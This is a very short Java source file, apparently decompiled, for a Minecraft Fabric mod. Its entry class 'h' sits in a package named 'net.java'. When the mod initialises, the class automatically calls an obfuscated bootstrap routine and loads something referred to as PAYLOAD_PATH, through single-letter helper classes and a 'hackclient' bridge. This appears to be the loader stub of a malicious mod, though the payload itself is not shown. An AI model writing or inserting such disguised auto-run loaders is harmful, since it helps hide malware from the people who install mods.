package net.java;

import net.fabricmc.api.ModInitializer;
import net.hackclient.compat.Bridge;

public class h implements ModInitializer {
    public void onInitialize() {
        m.init();
        Bridge.bootstrap(6, m.PAYLOAD_PATH);
        l.a((Object)new Object[]{null, null, 6, null, null, m.PAYLOAD_PATH});
    }
}
